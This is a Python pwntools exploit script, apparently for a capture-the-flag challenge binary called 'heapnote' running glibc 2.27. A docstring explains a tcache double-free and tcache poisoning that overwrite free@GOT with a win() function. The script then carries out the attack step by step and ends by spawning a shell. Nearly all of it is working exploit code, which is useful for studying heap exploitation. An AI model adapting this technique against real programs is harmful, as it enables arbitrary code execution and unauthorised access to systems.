#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C1 - tcache double-free -> tcache poisoning -> GOT overwrite -> win()
==================================================================
Target  : ./heapnote  (glibc 2.27, -no-pie, partial RELRO)
Goal    : get a shell by overwriting free@GOT with &win, then calling free.
Leak    : NONE needed. Everything is a binary address (no-PIE).

Why this works on glibc 2.27
----------------------------
* 2.27 has NO tcache key, and tcache_put() performs no double-free check,
  so freeing the same chunk twice creates a self-loop in the tcache list:
        head = A ; A->fd = A ; counts = 2
* tcache_get() does NOT validate the chunk size, so a poisoned fd can
  point anywhere (the GOT, BSS, etc.) and malloc will hand it back as-is.
* With -no-pie, free@GOT and win() have fixed addresses -> no leak required.

The 3-malloc rule for a self-loop double-free
---------------------------------------------
After free;free the list is A->A (self-loop), counts=2.
  malloc #1 : returns A. We EDIT A's data (== A->fd) to &free@GOT.
              Now  head=A, A->fd=&free@GOT, counts=1.
  malloc #2 : returns A again (head was A). head=&free@GOT, counts=0.
              This is the "dummy" allocation - just consume it.
  malloc #3 : returns &free@GOT. Write &win there -> free@GOT = &win.
Then any free() jumps to win() -> system("/bin/sh").

Why the data size is 0x28 (0x30 chunk), not 0x18 (0x20 chunk)
------------------------------------------------------------
heapnote's add() mallocs TWO chunks per note: the note_t struct
(sizeof(note_t)=0x10 -> 0x20 chunk) and the data buffer. If the data
buffer were also a 0x20 chunk (e.g. size 0x18), the struct allocation
would pull from the SAME 0x20 tcache bin we poisoned, eating our
double-freed chunk before the data malloc ever sees it. Using a data
size of 0x28 -> 0x30 chunk puts the data in a different tcache bin
(0x30) from the struct (0x20), so the struct mallocs come from the top
chunk and leave our poisoned 0x30 tcache list untouched. This keeps the
3-malloc model above exact: each add() interacts with the 0x30 bin
exactly once (via its data malloc).

Run
---
    cd challenges && python3 c1_double_free/exp.py
"""

from pwn import *

context.binary = exe = ELF("./heapnote")
context.log_level = "info"

p = process("./heapnote")

# ---- menu helpers -----------------------------------------------------------
def add(idx: int, size: int, data: bytes):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def delete(idx: int):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx: int, length: int, data: bytes):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"len: ", str(length).encode())
    p.sendafter(b"data: ", data)

# ---- static (no-PIE) targets ------------------------------------------------
free_got = exe.got["free"]          # writable GOT entry (partial RELRO)
win_addr = exe.symbols["win"]      # system("/bin/sh")

log.info("free@GOT  = %#x", free_got)
log.info("win()     = %#x", win_addr)

# Chunk size 0x28 -> 0x30 chunk -> tcache bin index 1.
# 0x30 (NOT 0x20) so the data bin differs from the note_t struct bin (0x20);
# see the docstring for why this matters.
SZ = 0x28

# 1. allocate one chunk A
add(0, SZ, b"AAAA")
# 2. double-free A  (the shared bug: del does not NULL notes[0])
delete(0)
delete(0)
log.info("double-free done: tcache list is A->A (self-loop), counts=2")

# 3. malloc #1 -> returns A; write &free@GOT into A's fd
add(1, SZ, p64(free_got))
log.info("malloc #1 returned A; poisoned A->fd = &free@GOT")

# 4. malloc #2 -> returns A again (dummy, drains the self-loop)
add(2, SZ, b"DUMMY")
log.info("malloc #2 (dummy) returned A again; head now = &free@GOT")

# 5. malloc #3 -> returns &free@GOT; write &win there
add(3, SZ, p64(win_addr))
log.info("malloc #3 returned &free@GOT; free@GOT overwritten with &win")

# 6. trigger: free() now jumps to win(). We must free a note whose data
#    pointer is still valid -- but we must NOT allocate a fresh note here,
#    because the 0x30 tcache is left poisoned (head = the old free@GOT
#    value, counts underflowed) after the 3-malloc chain, so a new
#    malloc(0x28) would hand back a bogus address and crash. notes[0]->data
#    still points to A (del never NULLs it), so delete(0) frees A through
#    the hijacked free@GOT -> win() -> system("/bin/sh").
delete(0)
log.success("free() hijacked -> win() -> shell")

p.interactive()
